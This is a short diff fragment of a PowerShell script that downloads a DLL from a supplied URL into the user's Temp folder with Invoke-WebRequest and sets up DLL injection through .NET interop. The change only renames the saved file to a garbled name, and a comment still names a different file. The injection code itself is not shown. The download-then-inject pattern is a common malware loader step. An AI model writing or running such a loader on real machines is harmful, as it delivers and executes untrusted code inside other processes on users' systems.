@@ -8,7 +8,7 @@ param(
 )
 
 # Download the DLL and save it to %LOCALAPPDATA%\Temp\temp.txt
-$downloadPath = "$env:LOCALAPPDATA\Temp\temp.dll"
+$downloadPath = "$env:LOCALAPPDATA\Temp\tasdasdemp.dll"
 Invoke-WebRequest -Uri $DllUrl -OutFile $downloadPath
 
 # DLL Injection code using .NET interop (requires administrative privileges typically)
